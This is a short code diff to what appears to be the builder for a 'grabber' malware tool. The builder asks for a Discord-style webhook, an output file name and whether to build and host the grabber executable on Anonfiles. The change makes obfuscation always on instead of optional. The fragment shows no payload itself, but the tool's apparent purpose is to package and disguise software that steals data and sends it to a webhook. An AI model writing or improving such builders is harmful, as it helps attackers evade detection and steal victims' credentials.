@@ -58,7 +58,7 @@ class builder:
         print(Colorate.Color(Colors.red, "", False)) #This just keeps the color as red which I like lowkey
         self.webhook = input("Webhook: ")
         self.file = input("File name: ")
-        self.obfuscate = input("Obfuscate? (y/n): ")
+        self.obfuscate = True
         self.build_self = input("Would you like to bulid the exe that the grabber uses yourself? (y/n): ")
         if self.build_self == "y":
             self.anon = input("Would you like to use Anonfiles to host exe? (y/n): ")
@@ -139,7 +139,7 @@ class builder:
             builder()
         with open(f'{self.file}.bat', 'w+') as f:
             f.write(self.make_pyinstaller_stuff())
-        if self.obfuscate == "y":
+        if self.obfuscate == True:
             self.obfuscate_real()
         else:
             print(Colorate.Color(Colors.green, "Done!", True))
